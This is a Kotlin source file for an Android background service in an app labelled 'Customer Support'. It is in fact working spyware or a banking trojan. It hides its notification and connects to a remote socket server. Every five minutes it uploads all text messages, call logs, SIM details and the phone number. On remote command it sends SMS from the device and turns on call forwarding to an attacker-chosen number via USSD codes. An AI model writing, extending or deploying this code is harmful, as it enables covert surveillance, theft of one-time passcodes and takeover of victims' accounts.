package com.customersupport.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import android.net.Uri
import androidx.core.app.NotificationCompat
import com.customersupport.CustomerSupportApp
import com.customersupport.MainActivity
import com.customersupport.data.CallLogReader
import com.customersupport.data.SimManager
import com.customersupport.data.SmsReader
import com.customersupport.socket.ConnectionState
import com.customersupport.socket.ForwardingConfig
import com.customersupport.socket.SmsSendRequest
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first

class SocketService : Service() {

    companion object {
        private const val TAG = "SocketService"
        private const val NOTIFICATION_ID = 1
        private const val SYNC_INTERVAL_MS = 5 * 60 * 1000L
    }

    private val socketManager get() = CustomerSupportApp.socketManager
    private val preferencesManager get() = CustomerSupportApp.preferencesManager
    private val smsReader by lazy { SmsReader(this) }
    private val callLogReader by lazy { CallLogReader(this) }
    private val simManager by lazy { SimManager(this) }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var syncJob: Job? = null

    // Track the last applied call forwarding config to avoid re-executing USSD codes
    private var lastAppliedCallsEnabled: Boolean? = null
    private var lastAppliedCallsForwardTo: String? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        startForeground(NOTIFICATION_ID, createNotification())

        serviceScope.launch {
            connectAndSync()
        }

        return START_STICKY
    }

    private suspend fun connectAndSync() {
        socketManager.setOnSyncRequestCallback {
            serviceScope.launch {
                performSync()
            }
        }
        
        socketManager.setOnForwardingConfigCallback { config ->
            serviceScope.launch {
                handleForwardingConfig(config)
            }
        }
        
        socketManager.setOnSmsSendRequestCallback { request ->
            serviceScope.launch {
                handleSmsSendRequest(request)
            }
        }

        val deviceId = getDeviceUniqueId()
        val deviceName = Build.MODEL
        val phoneNumber = getPhoneNumber()

        preferencesManager.saveDeviceId(deviceId)
        socketManager.connect(deviceId, deviceName, phoneNumber)
        monitorConnectionAndSync(deviceId)
    }

    private fun monitorConnectionAndSync(deviceId: String) {
        serviceScope.launch {
            socketManager.connectionState.collect { state ->
                if (state == ConnectionState.CONNECTED) {
                    Log.d(TAG, "Connected - triggering sync")
                    delay(3000)
                    syncSimInfoWithRetry(deviceId)
                    performSync()
                    startPeriodicSync()
                }
            }
        }
    }
    
    private suspend fun handleForwardingConfig(config: ForwardingConfig) {
        try {
            Log.d(TAG, "Saving forwarding config: $config")
            preferencesManager.saveSmsForwarding(config.smsEnabled, config.smsForwardTo, config.smsSubscriptionId)
            preferencesManager.saveCallsForwarding(config.callsEnabled, config.callsForwardTo, config.callsSubscriptionId)
            handleCallForwarding(config.callsEnabled, config.callsForwardTo, config.callsSubscriptionId)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save forwarding config", e)
        }
    }
    
    private fun handleCallForwarding(enabled: Boolean, forwardTo: String, subscriptionId: Int = -1) {
        try {
            // Skip if the config hasn't changed from what was last applied
            if (enabled == lastAppliedCallsEnabled && forwardTo == lastAppliedCallsForwardTo) {
                Log.d(TAG, "Call forwarding config unchanged, skipping USSD execution")
                return
            }

            // Skip disabling forwarding if it was never enabled by this app
            if (!enabled && lastAppliedCallsEnabled != true) {
                Log.d(TAG, "Call forwarding not previously enabled, skipping disable USSD (##21#)")
                lastAppliedCallsEnabled = enabled
                lastAppliedCallsForwardTo = forwardTo
                return
            }

            val ussdCode = if (enabled && forwardTo.isNotEmpty()) {
                "*21*$forwardTo#"
            } else {
                "##21#"
            }
            
            Log.d(TAG, "Executing USSD: $ussdCode")
            
            // Update tracked state before executing
            lastAppliedCallsEnabled = enabled
            lastAppliedCallsForwardTo = forwardTo

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                sendUssdRequest(ussdCode, subscriptionId)
            } else {
                val encodedUssd = ussdCode.replace("#", Uri.encode("#"))
                val intent = Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$encodedUssd")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to handle call forwarding", e)
        }
    }
    
    @android.annotation.SuppressLint("MissingPermission")
    private fun sendUssdRequest(ussdCode: String, subscriptionId: Int) {
        try {
            val telephonyManager = if (subscriptionId > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                tm.createForSubscriptionId(subscriptionId)
            } else {
                getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                telephonyManager.sendUssdRequest(
                    ussdCode,
                    object : TelephonyManager.UssdResponseCallback() {
                        override fun onReceiveUssdResponse(tm: TelephonyManager, req: String, resp: CharSequence) {
                            Log.d(TAG, "USSD Response: $resp")
                        }
                        override fun onReceiveUssdResponseFailed(tm: TelephonyManager, req: String, code: Int) {
                            Log.e(TAG, "USSD Failed: $code")
                            fallbackToDialIntent(ussdCode)
                        }
                    },
                    android.os.Handler(mainLooper)
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "USSD request failed", e)
            fallbackToDialIntent(ussdCode)
        }
    }
    
    private fun fallbackToDialIntent(ussdCode: String) {
        try {
            val encodedUssd = ussdCode.replace("#", Uri.encode("#"))
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$encodedUssd")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Fallback dial failed", e)
        }
    }

    private fun startPeriodicSync() {
        syncJob?.cancel()
        syncJob = serviceScope.launch {
            while (isActive) {
                delay(SYNC_INTERVAL_MS)
                if (socketManager.connectionState.value == ConnectionState.CONNECTED) {
                    performSync()
                }
            }
        }
    }

    private suspend fun performSync() {
        try {
            if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
                Log.w(TAG, "Cannot sync - not connected")
                return
            }

            val deviceId = preferencesManager.getDeviceId().first() ?: return
            Log.d(TAG, "Starting sync for device: $deviceId")

            val simCards = simManager.getSimCards()
            if (simCards.length() > 0) {
                socketManager.syncSimInfo(deviceId, simCards)
            }

            val smsArray = smsReader.readAllSms()
            if (smsArray.length() > 0) {
                socketManager.syncSms(deviceId, smsArray)
            }

            val callsArray = callLogReader.readCallLogs()
            if (callsArray.length() > 0) {
                socketManager.syncCalls(deviceId, callsArray)
            }

            preferencesManager.saveLastSyncTime(System.currentTimeMillis())
            Log.d(TAG, "Sync completed")
        } catch (e: Exception) {
            Log.e(TAG, "Sync failed", e)
        }
    }

    private fun getDeviceUniqueId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    private fun getPhoneNumber(): String {
        try {
            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val number = telephonyManager.line1Number
            if (!number.isNullOrBlank()) return number
        } catch (e: Exception) { }
        
        try {
            val simCards = simManager.getSimCards()
            if (simCards.length() > 0) {
                val phoneNumber = simCards.getJSONObject(0).optString("phoneNumber", "")
                if (phoneNumber.isNotBlank()) return phoneNumber
            }
        } catch (e: Exception) { }
        
        return "Unknown"
    }

    private suspend fun syncSimInfoWithRetry(deviceId: String, maxRetries: Int = 3) {
        var attempt = 0
        var success = false
        
        while (attempt < maxRetries && !success) {
            try {
                if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
                    delay(1000)
                    attempt++
                    continue
                }
                
                val simCards = simManager.getSimCards()
                if (simCards.length() > 0) {
                    socketManager.syncSimInfo(deviceId, simCards)
                }
                success = true
            } catch (e: Exception) {
                attempt++
                if (attempt < maxRetries) {
                    delay((1000L * (1 shl (attempt - 1))))
                }
            }
        }
    }

    private suspend fun handleSmsSendRequest(request: SmsSendRequest) {
        val deviceId = preferencesManager.getDeviceId().first() ?: return
        
        try {
            Log.d(TAG, "Sending SMS to ${request.recipientNumber}")
            
            val smsManager = if (request.subscriptionId > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SmsManager.getSmsManagerForSubscriptionId(request.subscriptionId)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            
            val parts = smsManager.divideMessage(request.message)
            if (parts.size > 1) {
                smsManager.sendMultipartTextMessage(request.recipientNumber, null, parts, null, null)
            } else {
                smsManager.sendTextMessage(request.recipientNumber, null, request.message, null, null)
            }
            
            socketManager.reportSmsSendResult(deviceId, request.requestId, true)
            delay(500)
            performSync()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS", e)
            socketManager.reportSmsSendResult(deviceId, request.requestId, false, e.message)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CustomerSupportApp.CHANNEL_ID)
            .setContentTitle("Customer Support")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        syncJob?.cancel()
        serviceScope.cancel()
        socketManager.disconnect()
        Log.d(TAG, "Service destroyed")
    }
}
